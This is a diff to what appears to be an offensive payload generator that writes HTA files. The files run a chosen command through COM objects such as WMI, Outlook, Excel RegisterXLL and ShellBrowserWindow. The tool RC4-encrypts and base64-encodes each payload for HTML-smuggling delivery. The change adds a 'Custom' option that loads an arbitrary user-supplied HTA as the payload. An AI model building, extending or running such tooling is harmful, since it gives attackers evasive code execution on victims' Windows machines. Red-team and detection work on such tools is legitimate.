@@ -67,12 +67,14 @@ self.close
 with open("templates/xll_hta.txt") as f:
 	XLL_HTA = f.read()
 
+CUSTOM_PAYLOAD = "Custom"
 
 PAYLOAD_OPTIONS = {
 	"WbemScripting.SWbemLocator": WMI_HTA,
 	"Outlook.Application": OUTLOOK_HTA,
 	"Excel.RegisterXLL": XLL_HTA,
-	"ShellBrowserWindow": SHELLBROWSER_HTA
+	"ShellBrowserWindow": SHELLBROWSER_HTA,
+	CUSTOM_PAYLOAD: "" # user-provided HTA
 }
 
 
@@ -112,7 +114,7 @@ if __name__ == '__main__':
 	parser.add_argument("-k", "--key", help="Encryption key", dest="key")
 	parser.add_argument("-p", "--payload", help="Payload type to use", dest="payload", choices=payload_choices())
 	parser.add_argument("-l", "--list-payloads", help="List payloads available", action="store_const", const="list_payloads")
-	parser.add_argument("-c", "--command", help="Command to run from HTA", dest="command")
+	parser.add_argument("-c", "--command", help="Command to run from HTA / HTA file if \"Custom\" payload is chosen", dest="command")
 	parser.add_argument("-o", "--output", help="Name of the HTA file to generate", dest="output")
 	args = parser.parse_args()
 
@@ -122,7 +124,11 @@ if __name__ == '__main__':
 		sys.exit(1)
 
 	if args.key and args.command and args.output and args.payload:
-		hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
+		if args.payload == CUSTOM_PAYLOAD:
+			with open(args.command, 'r') as f:
+				hta_text = f.read()
+		else:
+			hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
 		hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
 		filename_encrypted = base64.b64encode(rc4(args.key, args.output))
 		# blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
